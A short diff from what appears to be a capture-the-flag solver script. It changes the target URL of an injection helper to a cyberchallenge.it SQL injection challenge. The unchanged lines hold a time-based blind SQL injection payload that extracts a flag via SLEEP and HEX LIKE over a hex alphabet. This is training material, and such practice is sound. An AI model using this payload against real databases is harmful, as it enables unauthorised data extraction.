@@ -39,7 +39,7 @@ class Inj:
 
 
 payload = "1' AND (SELECT SLEEP(1) FROM flags WHERE HEX(flag) LIKE '{}%')='1"
-inj = Inj('http://web-17.challs.olicyber.it')
+inj = Inj('http://sqlinjection.challs.cyberchallenge.it/')
 
 dictionary = '0123456789abcdef'
 result = ''
